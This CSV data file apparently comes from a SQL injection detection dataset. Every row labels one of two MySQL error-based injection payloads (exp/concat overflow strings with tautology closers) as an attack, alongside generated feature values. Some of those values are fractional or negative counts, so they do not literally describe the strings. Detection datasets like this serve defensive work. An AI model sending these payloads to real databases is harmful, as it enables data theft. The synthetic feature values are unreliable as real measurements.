id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000098,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.719980362687904,259.0375671386719,71.65442657470703,37.33201599121094,99.78406524658203,1.9085237979888916,76.23434448242188,41.577327728271484,1.0603793859481812,0.30046817660331726,0.15154176950454712,0.3973749279975891,0.13255858421325684,3.7334249019622803,1.3057233095169067,0.8431758284568787,0.6056903004646301,0.1289730668067932,0.05676901713013649,0.15737369656562805,10.275752067565918,9.819292068481445,3.0149595737457275,0.13267618417739868,1.894192099571228,0.13600246608257294,0.01608680747449398,0.017368730157613754,-0.008248892612755299,0.5694781541824341,-0.10564659535884857,-0.16516508162021637,1.442419409751892,0.01850091852247715,0.32694515585899353,2.299030303955078,7.983904838562012,0.8803945183753967,2.0356833934783936,0.1635618805885315,0.42298102378845215,0.9866750836372375,-0.10116551071405411,0.01658800058066845,0.20424365997314453,-0.059628114104270935,-0.25412288308143616,0.4620393216609955,0.4490969777107239,0.47442910075187683,0.18235528469085693,0.2670378088951111,-0.1514149010181427,0.07805526256561279,0.2086905539035797,-0.0022624842822551727,0.04125761613249779,0.0017574429512023926,0.05518915504217148,0.23605412244796753,0.047827206552028656,-0.020852431654930115,-0.13792628049850464,0.011432994157075882,0.21403247117996216,0.01636899635195732,0.47596871852874756,0.06299389898777008,0.06905285269021988,0.007518604397773743,0.022536542266607285,-0.0318758524954319,0.05713030695915222,0.05774668604135513,0.08026158809661865,0.005923749879002571,1.3228039741516113,0.3783729672431946,-0.07047770917415619,0.07884962856769562,0.1973554491996765,8.106084823608398,0.8863978981971741,0.179546520113945,0.0006613571895286441,0.571826159954071,-0.04625077173113823,0.10567726939916611,0.03364120423793793
GAN_000099,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.766957758767032,251.4593505859375,70.47193908691406,35.63348388671875,99.86491394042969,5.167945861816406,75.13282775878906,43.171756744384766,1.137688159942627,0.28952738642692566,0.1506865918636322,0.4042981266975403,0.12935853004455566,3.720642566680908,1.14643132686615,0.9999825358390808,0.7099331617355347,0.13078993558883667,0.08601336926221848,0.3007325232028961,9.834338188171387,9.405526161193848,2.8484153747558594,0.1491571068763733,1.8753918409347534,0.1951502114534378,0.10500358045101166,0.09844110161066055,0.0878712460398674,0.5880067348480225,0.00022905319929122925,-0.07722461223602295,1.453351378440857,0.20173752307891846,0.3334309756755829,2.1448826789855957,7.028439521789551,0.6922815442085266,1.9279654026031494,0.026696085929870605,0.4820880889892578,1.0317858457565308,0.021140705794095993,0.04564724490046501,0.16736075282096863,-0.24423030018806458,-0.23853901028633118,0.5177933573722839,0.5167830586433411,0.4466666281223297,0.2084781974554062,0.25917017459869385,-0.16000151634216309,0.08965076506137848,0.16809651255607605,0.03527969866991043,0.037451401352882385,0.10824194550514221,-0.14473560452461243,-0.063797228038311,0.16058337688446045,0.17173482477664948,-0.19426435232162476,-0.09192138910293579,0.26301902532577515,0.015699584037065506,0.457137793302536,0.15644989907741547,0.1426067054271698,-0.043179951608181,-0.1058424562215805,-0.44235292077064514,-0.18071439862251282,0.060146525502204895,0.05581532418727875,0.009959731251001358,1.3754693269729614,0.1589391827583313,-0.10670429468154907,0.03447909653186798,0.12589307129383087,7.412923336029053,0.8198011517524719,0.14991828799247742,-0.06297778338193893,0.6160703301429749,-0.06190457195043564,-0.004358004778623581,-0.21288838982582092
GAN_000100,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.839376890862683,262.4436340332031,67.98289489746094,34.826263427734375,96.88334655761719,2.5068485736846924,79.71958923339844,44.00551223754883,1.0132650136947632,0.2931477129459381,0.1504621058702469,0.39829757809638977,0.13419555127620697,3.6894690990448,1.126497745513916,0.9395577311515808,0.4948851764202118,0.12831667065620422,0.024832474067807198,0.049818240106105804,10.289377212524414,9.262659072875977,2.4128005504608154,0.22395074367523193,2.0326762199401855,0.15265880525112152,0.05397612228989601,-0.031047184020280838,-0.05460921302437782,0.5939781069755554,-0.12588992714881897,-0.0963224545121193,1.3312978744506836,-0.02349349856376648,0.3518509566783905,2.296494245529175,7.539153099060059,0.7848849296569824,2.2097957134246826,0.22659559547901154,0.4926852881908417,1.0641428232192993,-0.17740380764007568,0.021382227540016174,0.3661019206047058,-0.07656988501548767,-0.35824722051620483,0.4357825219631195,0.3250853717327118,0.5027778744697571,0.12717776000499725,0.3448132574558258,-0.28632140159606934,0.2661856710910797,0.2759725749492645,-0.05429792031645775,-0.011285852640867233,-0.10510428249835968,0.3079036474227905,0.23784542083740234,0.031012021005153656,0.039308927953243256,-0.26348036527633667,0.003862626850605011,0.2524816691875458,0.09830217063426971,0.500095546245575,0.4159964323043823,-0.017054826021194458,-0.09001580625772476,-0.006731875240802765,-0.06354179233312607,0.07831843942403793,0.04376780986785889,0.07982976734638214,0.011220135726034641,1.2872403860092163,0.3295483887195587,-0.1620950549840927,0.018652983009815216,0.23656579852104187,8.248461723327637,0.9488264918327332,0.18025225400924683,0.002321674255654216,0.5246371030807495,-0.19015538692474365,0.21351000666618347,0.021187692880630493
GAN_000101,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,5.009788762484384,260.30389404296875,65.83789825439453,38.616790771484375,103.00486755371094,-1.8404271602630615,83.67451477050781,45.48339080810547,1.16050124168396,0.2722586989402771,0.15052145719528198,0.39449217915534973,0.13295991718769073,3.746209144592285,1.5785244703292847,1.006769061088562,0.6304238438606262,0.14847439527511597,0.04271987825632095,0.24375857412815094,10.33475399017334,9.273008346557617,2.8663272857666016,-0.04086460918188095,1.8706307411193848,0.1473241150379181,-0.13071100413799286,-0.03694038465619087,0.005506577435880899,0.6373385190963745,-0.010256223380565643,-0.3571058213710785,1.6061159372329712,0.2270854413509369,0.31972163915634155,2.248241424560547,7.287322521209717,0.7034570574760437,1.8962122201919556,0.08714857697486877,0.5197643041610718,0.9665646553039551,-0.01880219578742981,0.03881311044096947,0.2905934154987335,0.018933415412902832,-0.14120163023471832,0.5257620215415955,0.49679216742515564,0.5399435758590698,0.18919764459133148,0.3778861463069916,-0.21173977851867676,-0.16125017404556274,0.1402728408575058,0.028481870889663696,0.03667368367314339,0.09029802680015564,-0.03506551682949066,0.26344648003578186,-0.08975918591022491,0.4120779037475586,-0.1228698119521141,0.07198551297187805,0.19600693881511688,0.029144320636987686,0.41386911273002625,0.21139802038669586,0.1479046642780304,-0.10490388423204422,-0.1745094656944275,-0.13669945299625397,0.11439302563667297,0.13916003704071045,0.07185841351747513,0.01233405526727438,1.2250943183898926,0.182312473654747,-0.1722632795572281,0.05644936487078667,0.10575482994318008,7.889952182769775,0.9448319673538208,0.22324678301811218,-0.07271721214056015,0.6028876304626465,-0.05342911183834076,0.30106478929519653,0.06800080835819244
GAN_000102,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,5.2648225101086785,260.9497985839844,74.0820541381836,35.97847366333008,99.2474594116211,-5.047550678253174,77.99736785888672,46.39728927612305,1.0894454717636108,0.2502940595149994,0.14908427000045776,0.40328341722488403,0.12928250432014465,3.6664390563964844,1.341676950454712,1.5441893339157104,0.9026057124137878,0.10069713741540909,0.10036427527666092,0.08967091143131256,11.56261157989502,9.65684700012207,2.6735308170318604,-0.028715752065181732,1.6639764308929443,0.1662658452987671,0.2108239084482193,-0.20114773511886597,0.06975497305393219,0.7052725553512573,-0.17698808014392853,-0.13213478028774261,1.2975176572799683,0.19801512360572815,0.30887284874916077,2.1820273399353027,7.277470588684082,0.8058088421821594,2.0483479499816895,0.024072498083114624,0.5718129873275757,1.0917341709136963,-0.09758947044610977,0.02757168747484684,0.35476163029670715,-0.2982262969017029,-0.17746610939502716,0.5960466265678406,0.4919368624687195,0.6162764430046082,0.04155648499727249,0.2870923578739166,-0.10043392330408096,0.30561918020248413,0.13663294911384583,-0.036510568112134933,0.07591413706541061,0.10651178658008575,0.1322702169418335,0.3666671812534332,0.05870003253221512,0.06375175714492798,-0.3602330982685089,-0.15109595656394958,0.32292085886001587,0.04641326144337654,0.4763432443141937,0.3425307869911194,0.11256597936153412,0.008473612368106842,-0.23145514726638794,-0.3029499650001526,0.021268662065267563,0.01525222510099411,0.11192875355482101,0.005612799897789955,1.5010309219360352,0.15740050375461578,-0.22660531103610992,-0.026986323297023773,0.1401452273130417,6.989321708679199,0.9927233457565308,0.1763996183872223,-0.07236282527446747,0.673387348651886,0.23020270466804504,0.06868084520101547,0.00020007044076919556
GAN_000103,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.913078731542674,272.10076904296875,67.55656433105469,31.872026443481445,90.96868896484375,-1.3865573406219482,82.19066619873047,48.5535774230957,0.9406840205192566,0.25254112482070923,0.16902519762516022,0.39781492948532104,0.13260115683078766,3.698256254196167,1.0991041660308838,1.1524101495742798,0.5402539968490601,0.13963308930397034,0.046563755720853806,-0.12883225083351135,9.8781156539917,8.776548385620117,1.6089433431625366,-0.03450600057840347,1.9750521183013916,0.15030460059642792,-0.0034651856403797865,-0.2310466766357422,0.014748594723641872,0.6338440775871277,0.027010060846805573,-0.08801977336406708,1.384121298789978,0.04267001152038574,0.33794254064559937,2.126971483230591,7.571415901184082,0.8517780900001526,2.2051453590393066,0.25988340377807617,0.431789755821228,0.9632136821746826,-0.13633784651756287,0.054901327937841415,0.2929629981517792,-0.2303888499736786,0.024922817945480347,0.374787837266922,0.40018409490585327,0.5628747344017029,0.024861225858330727,0.2762908339500427,-0.09597689658403397,0.1903861165046692,0.1468094140291214,-0.018880274146795273,0.018872611224651337,0.09170795977115631,0.148757666349411,0.360503226518631,-0.08637943863868713,-0.031833846122026443,-0.17177456617355347,0.0038261860609054565,0.30681848526000977,-0.0661802589893341,0.5868992209434509,0.5167526602745056,-0.06295982003211975,-0.05609136074781418,-0.0009303241968154907,-0.10446015745401382,0.30960813164711,0.13293802738189697,0.07666055858135223,0.00932153407484293,1.4112844467163086,0.29906409978866577,-0.321371853351593,0.051077425479888916,0.29773980379104614,7.876881122589111,0.9755464792251587,0.15221181511878967,0.03147001191973686,0.5932767391204834,0.24533158540725708,-0.008100656792521477,-0.05213328078389168
GAN_000104,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.638096985787172,252.52232360839844,68.4490737915039,35.23641586303711,98.13898468017578,-0.14662811160087585,81.49905395507812,45.31329345703125,0.7920268774032593,0.27323049306869507,0.1685791313648224,0.39446598291397095,0.1303267925977707,3.7668046951293945,1.472978949546814,0.7278037071228027,0.5089983940124512,0.12590140104293823,0.04658692702651024,0.4087418019771576,8.84535026550293,9.859576225280762,2.853447675704956,0.013438813388347626,1.7916609048843384,0.12698549032211304,-0.2947363555431366,-0.01666628196835518,0.04911855608224869,0.5061925649642944,-0.022398844361305237,-0.20204901695251465,1.702713131904602,0.19084644317626953,0.36695361137390137,2.0190482139587402,7.167222023010254,0.9724321365356445,1.9138833284378052,0.16961373388767242,0.359903484582901,0.981659471988678,-0.08823516219854355,0.0405731163918972,0.08858699351549149,-0.03284335136413574,0.12377181649208069,0.47639530897140503,0.500973641872406,0.5000203847885132,0.19840165972709656,0.2311895489692688,0.029671210795640945,-0.20818133652210236,0.11253410577774048,0.04295775666832924,0.04682876542210579,0.2498588263988495,-0.03704429417848587,0.2692108154296875,-0.1458737552165985,0.013763315975666046,-0.0357089564204216,0.17816556990146637,0.20909270644187927,-0.09120070189237595,0.42874273657798767,0.14746709167957306,0.15268990397453308,0.013439424335956573,0.001471303403377533,-0.2170751988887787,0.1951121687889099,0.140863299369812,0.029333466663956642,0.0035008208360522985,1.493913173675537,0.32967618107795715,-0.223604217171669,0.08896645903587341,0.2405674010515213,7.479332447052002,0.9115952849388123,0.1845913976430893,-0.020147426053881645,0.5691620111465454,0.1374160200357437,-0.09192654490470886,-0.01725155860185623
GAN_000105,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.572706445933335,264.8846130371094,74.79415893554688,37.042510986328125,101.89122772216797,5.900068283081055,71.89495849609375,38.886375427246094,1.0840706825256348,0.31012648344039917,0.1478291153907776,0.39903756976127625,0.1331373006105423,3.7572875022888184,1.44137704372406,0.8913851976394653,0.608951210975647,0.13407155871391296,0.05301511287689209,0.08961055427789688,9.100049018859863,9.761205673217773,2.7324535846710205,0.1449815034866333,2.0361485481262207,0.1259724646806717,0.016068411991000175,0.11809699982404709,0.04115347936749458,0.5569618940353394,0.016957521438598633,-0.08957858383655548,1.5439834594726562,0.02828008495271206,0.29620030522346497,2.097583055496216,7.513368129730225,0.9106148481369019,2.0472464561462402,0.20626860857009888,0.3391842246055603,0.9259751439094543,-0.013625942170619965,0.061963289976119995,0.005305774509906769,-0.030243247747421265,-0.24720822274684906,0.45217424631118774,0.3657624423503876,0.39967674016952515,0.3226005733013153,0.36694586277008057,-0.1444341242313385,0.08366678655147552,0.20953774452209473,0.0383785218000412,0.032934803515672684,-0.0248316191136837,0.0195763036608696,-0.04181583970785141,-0.00730963796377182,-0.017753910273313522,-0.08582309633493423,0.020089663565158844,0.1941450834274292,-0.10501141101121902,0.5279203653335571,0.13014303147792816,0.0851985290646553,0.04901359602808952,0.07402241975069046,-0.08330897986888885,-0.007137823849916458,0.14124123752117157,0.054333265870809555,0.01305629126727581,1.1619175672531128,0.3430244028568268,-0.003375336527824402,0.06410413980484009,0.22115832567214966,8.245561599731445,0.7553510665893555,0.10648491978645325,0.01382801216095686,0.566017746925354,-0.0742415189743042,0.02329268679022789,-0.1377960443496704
GAN_000106,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.874732592917757,254.69586181640625,73.69587707519531,33.75836181640625,96.79183197021484,2.697394609451294,74.75697326660156,42.17400360107422,1.0628738403320312,0.285929799079895,0.16600997745990753,0.40183642506599426,0.12722615897655487,3.7324044704437256,0.9604475498199463,1.0536930561065674,0.6238093376159668,0.14006094634532928,0.08292306959629059,0.08773743361234665,10.027234077453613,9.15239143371582,2.2930498123168945,-0.0037147626280784607,1.9059804677963257,0.17605948448181152,0.04099740833044052,-0.01031963899731636,0.07927359640598297,0.5675472617149353,0.0604056753218174,-0.2322290539741516,1.4776734113693237,-0.06991653889417648,0.2770499885082245,2.2342169284820557,7.779206275939941,1.0621159076690674,2.0942349433898926,0.09797868132591248,0.40996843576431274,0.8698090314865112,-0.011262267827987671,0.0634647086262703,0.07656537741422653,-0.3978966176509857,-0.04958634078502655,0.5011935234069824,0.47922906279563904,0.49219170212745667,0.2456514537334442,0.19742543995380402,-0.162704735994339,0.22968077659606934,0.18747416138648987,0.033732060343027115,0.05038261413574219,-0.003297606483101845,-0.0825706273317337,0.2815167009830475,0.03816995769739151,-0.08644312620162964,-0.15230083465576172,0.0881621390581131,0.2771269977092743,-0.017718911170959473,0.5142165422439575,0.21101014316082,0.07918523252010345,0.04995077848434448,0.10829783976078033,-0.14779679477214813,0.14250697195529938,-0.043110236525535583,0.08407827466726303,0.002252500504255295,1.3292397260665894,0.36969807744026184,-0.1886320561170578,0.08973652869462967,0.23676995933055878,7.475265026092529,0.8495351076126099,0.15873385965824127,0.03934869170188904,0.6588507294654846,0.15628229081630707,-0.21198037266731262,0.0370221883058548
GAN_000107,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.6894401407083475,256.81158447265625,67.87435913085938,36.497474670410156,102.31979370117188,2.7099392414093018,80.3327407836914,42.921844482421875,1.160902738571167,0.2681048810482025,0.15271645784378052,0.39253297448158264,0.1328861117362976,3.7341678142547607,1.4073209762573242,0.8532676696777344,0.5594661235809326,0.13226467370986938,0.0170669537037611,0.18112227320671082,9.457723617553711,9.311878204345703,2.6542351245880127,0.02022269368171692,1.9369752407073975,0.12545931339263916,-0.15908758342266083,0.01087849959731102,-0.01516666729003191,0.6144598722457886,0.02153189852833748,-0.13849541544914246,1.4343245029449463,0.17519065737724304,0.3132292926311493,2.1240692138671875,7.278045177459717,0.5762211680412292,1.8031903505325317,0.22557467222213745,0.4459914565086365,1.0876580476760864,0.037326958030462265,0.015797670930624008,0.2103169858455658,0.06640991568565369,-0.22083473205566406,0.4457208812236786,0.3991282284259796,0.4521588385105133,0.15776309370994568,0.3932756781578064,-0.11474532634019852,-0.033416494727134705,0.20981810986995697,0.017129719257354736,0.017904039472341537,0.045456189662218094,0.07433219999074936,0.1230364590883255,-0.10327590256929398,0.26958799362182617,-0.04332742840051651,0.014573592692613602,0.19582819938659668,0.01555640622973442,0.4610327482223511,0.21014399826526642,0.14955145120620728,-0.13101276755332947,-0.08228656649589539,-0.1051371768116951,0.06805387884378433,0.1972775012254715,0.05006163567304611,0.01819457858800888,1.2569562196731567,0.24888530373573303,-0.19420652091503143,0.04236799478530884,0.21247164905071259,8.266818046569824,0.8890088200569153,0.19650119543075562,-0.03669169917702675,0.5054726004600525,-0.1316789984703064,0.3068169355392456,-0.06764968484640121
GAN_000108,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.68228623723138,255.90321350097656,76.70933532714844,34.57526779174805,96.03730773925781,2.740678071975708,73.85918426513672,44.641292572021484,1.2251371145248413,0.27397167682647705,0.15629391372203827,0.3923875093460083,0.13143569231033325,3.7226552963256836,1.4334584474563599,0.9034408926963806,0.6990131139755249,0.10417471081018448,0.05474703758955002,0.028015220537781715,10.506904602050781,9.38879108428955,2.710817337036133,0.005433030426502228,1.8819637298583984,0.10011207312345505,0.06765731424093246,-0.03885461762547493,-0.0019189430167898536,0.6184580326080322,-0.08602376282215118,-0.055456455796957016,1.5903691053390503,0.3242065906524658,0.3981078267097473,2.0808446407318115,6.939201831817627,0.8045743703842163,2.0795023441314697,0.23139098286628723,0.48127827048301697,1.0007710456848145,0.05787133425474167,0.027258971706032753,0.061683155596256256,-0.019501984119415283,-0.2101355791091919,0.43226486444473267,0.41381382942199707,0.49333298206329346,0.07451996952295303,0.32074621319770813,-0.11348267644643784,0.024586670100688934,0.2181130349636078,-0.025323498994112015,0.03332386910915375,-0.22296158969402313,0.2306409776210785,0.22974488139152527,-0.17397071421146393,0.04033469408750534,0.05002262815833092,-0.030016500502824783,0.2239464372396469,-0.07377465814352036,0.5653192400932312,0.04914890229701996,0.10307673364877701,-0.059350959956645966,0.1038455069065094,-0.07557597756385803,0.2158004343509674,0.1602240651845932,0.06534239649772644,0.0064980401657521725,1.2913206815719604,0.3169618248939514,-0.31331366300582886,0.007490403484553099,0.2033875733613968,7.699750900268555,0.8820457458496094,0.16308648884296417,-0.005627692677080631,0.5764446258544922,0.01093132421374321,0.0602317675948143,0.03819115459918976
GAN_000109,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.676787427954886,261.63665771484375,74.73786163330078,36.10267639160156,96.67093658447266,5.216907501220703,73.64513397216797,40.607421875,1.0116044282913208,0.29827433824539185,0.1482343226671219,0.39513278007507324,0.13121643662452698,3.7430830001831055,1.3471721410751343,0.758694589138031,0.5917386412620544,0.08055714517831802,0.05764375254511833,0.054146841168403625,10.227049827575684,9.56317138671875,2.788832664489746,0.14478600025177002,1.9151016473770142,0.13493004441261292,0.07072551548480988,0.06720233708620071,0.03612563759088516,0.568600058555603,-0.06775900721549988,-0.11094699800014496,1.3909902572631836,0.04302167519927025,0.3065609931945801,2.219587802886963,7.8288044929504395,0.869053304195404,1.9835940599441528,0.11260803043842316,0.4818093180656433,1.0211129188537598,0.01275651901960373,0.023381873965263367,0.1296573281288147,-0.06960369646549225,-0.202976256608963,0.43315085768699646,0.4275524318218231,0.46098238229751587,0.23244372010231018,0.3276171088218689,-0.15484070777893066,0.10190688073635101,0.2375621199607849,0.017734486609697342,0.02924652025103569,-0.02460872009396553,0.06024792045354843,0.23401209712028503,-0.001836046576499939,0.0553165078163147,-0.08170527964830399,0.0009718239307403564,0.20920434594154358,0.07861347496509552,0.4873720407485962,0.10065604746341705,0.0405128076672554,-0.03799665719270706,-0.030937902629375458,-0.16424357891082764,0.053050391376018524,0.001108318567276001,0.046905066817998886,0.007698367815464735,1.236323356628418,0.31541284918785095,-0.07945860922336578,0.05358600988984108,0.21170444786548615,8.059137344360352,0.8564388751983643,0.15414802730083466,0.01807193085551262,0.572685182094574,-0.043793972581624985,0.04841943830251694,0.039613232016563416
GAN_000110,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,5.168721227693048,261.9516296386719,69.9232177734375,33.976261138916016,98.66919708251953,4.764065742492676,85.16854095458984,44.666534423828125,0.7182469367980957,0.2712446451187134,0.14578911662101746,0.39609596133232117,0.12911227345466614,3.7735214233398438,1.1248981952667236,1.0844171047210693,0.5263732075691223,0.04903702065348625,0.07990199327468872,0.022584358230233192,10.49245548248291,10.019164085388184,2.336912155151367,0.18561199307441711,1.7974094152450562,0.16806863248348236,0.10145051032304764,-0.1214938536286354,0.03573167696595192,0.6531384587287903,-0.1289496123790741,-0.16723774373531342,1.4310117959976196,0.010410824790596962,0.36122122406959534,2.082310438156128,7.587220668792725,0.8924364447593689,1.9535291194915771,0.0394614040851593,0.596668004989624,1.1698890924453735,-0.0764443501830101,0.027874570339918137,0.33023375272750854,-0.14450395107269287,-0.07098539173603058,0.4834076762199402,0.5238561034202576,0.6413495540618896,0.19266238808631897,0.27782565355300903,-0.01374102383852005,0.19035407900810242,0.21511982381343842,-0.016043905168771744,-0.0019869913812726736,-0.0676889568567276,0.19102823734283447,0.36979785561561584,0.012820243835449219,0.10911431908607483,-0.18882635235786438,-0.13546335697174072,0.23663708567619324,-0.00674009695649147,0.32735389471054077,0.41116201877593994,0.12256227433681488,-0.08301063627004623,-0.2500704228878021,-0.1290881335735321,0.17505554854869843,0.04297209531068802,0.044087909162044525,-0.002298389794304967,1.3643763065338135,0.1990458369255066,-0.17059732973575592,0.0031634042970836163,0.18846824765205383,7.603854179382324,0.990196168422699,0.14920936524868011,-0.01528110820800066,0.5872287750244141,0.2252996861934662,0.1681797206401825,0.30573976039886475
GAN_000111,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.803106401695372,248.52098083496094,70.56266021728516,36.79305648803711,104.64131164550781,0.5007794499397278,79.19947052001953,46.07550048828125,1.1960514783859253,0.25793352723121643,0.15519195795059204,0.3924141228199005,0.13180400431156158,3.7337961196899414,1.6314897537231445,0.8879142999649048,0.6828379034996033,0.17787130177021027,0.03348959982395172,0.2541705369949341,10.422988891601562,9.21405029296875,2.8752825260162354,0.0351693220436573,1.8203747272491455,0.13102175295352936,0.001818616408854723,-0.0322011299431324,0.0016197996446862817,0.699852466583252,0.0003191158175468445,-0.2184232771396637,1.5566843748092651,0.34907567501068115,0.35553497076034546,2.098379135131836,7.035162448883057,0.5377791523933411,1.8761937618255615,0.1432163566350937,0.558688759803772,1.0638121366500854,0.15461498498916626,0.015333577059209347,0.30196693539619446,-0.06449262797832489,-0.11830681562423706,0.3908555805683136,0.4553103744983673,0.5418781042098999,0.06533873826265335,0.3721331059932709,0.09542535245418549,-0.11705328524112701,0.14277905225753784,-0.007092032581567764,0.0608333982527256,-0.021922554820775986,0.023735396564006805,0.19476936757564545,-0.10832131654024124,0.20236486196517944,0.018737226724624634,-0.04109345003962517,0.1856582909822464,0.10358898341655731,0.47431808710098267,0.140532985329628,0.09108293801546097,-0.12294010072946548,-0.223528653383255,-0.25279033184051514,0.010955758392810822,0.22593939304351807,0.040701378136873245,0.017926592379808426,1.3672183752059937,0.19010812044143677,-0.36986029148101807,0.03507591784000397,0.1520645022392273,8.252567291259766,0.9332026839256287,0.1904624104499817,-0.07161346077919006,0.556297779083252,-0.06812776625156403,0.34588032960891724,-0.029742032289505005
